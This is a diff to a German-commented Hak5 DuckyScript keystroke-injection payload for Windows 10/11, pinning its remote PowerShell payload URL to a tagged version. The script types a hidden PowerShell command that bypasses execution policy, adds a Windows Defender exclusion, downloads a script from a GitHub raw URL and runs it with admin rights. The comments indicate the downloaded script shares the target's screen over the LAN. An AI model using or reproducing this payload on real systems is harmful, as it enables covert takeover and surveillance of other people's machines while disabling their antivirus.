@@ -9,15 +9,20 @@ REM     Beenden: ESC auf dem Ziel 5 Sekunden gedrueckt halten.
 
 REM     Target: Windows 10/11
 
-REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/HEAD/s.ps1
+REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.1/s.ps1
 REM     (s.ps1 = identische Kurz-Datei von Screenshare-Over-LAN-fixed.ps1,
-REM      spart 25 Zeichen im 259-Zeichen-Limit; HEAD statt 'main' ist
-REM      robust gegen ein Umbenennen des Branches)
+REM      spart 23 Zeichen im 259-Zeichen-Limit)
+REM     Der Tag 'v1.1' ist ABSCHLIESSEND (immutable): der Inhalt dahinter
+REM     kann sich nicht mehr aendern. Das ist wichtig, weil GitHub die
+REM     Raw-Dateien von beweglichen Refs ('main', 'HEAD') zum Teil minutenlang
+REM     aus dem CDN-Cache ausliefert - man laege dann eine alte Version.
+REM     Bei einer neuen Version bekommt das ps1 einen neuen Tag (z. B. v1.2)
+REM     und die URL in diesem Script wird angepasst.
 
 REM     WICHTIG - 259-Zeichen-Limit:
 REM     Das Eingabefeld des Windows-Run-Dialogs fasst hoechstens 259 Zeichen,
 REM     danach wird der Text abgeschnitten und der Befehl laeuft unvollstaendig.
-REM     Der folgende Befehl hat 220 Zeichen und muss in EINEN STRING-Block
+REM     Der folgende Befehl hat 213 Zeichen und muss in EINEN STRING-Block
 REM     (kein Aufteilen, sonst geht die Trennungsstelle kaputt).
 
 REM     So funktioniert der Befehl:
@@ -56,7 +61,7 @@ REM       * Administratorrechte (Firewall, URL-Reservation, Defender-Ausnahme)
 
 GUI r
 DELAY 1200
-STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/HEAD/s.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
+STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.1/s.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
 DELAY 800
 CTRL-SHIFT ENTER
 DELAY 3000
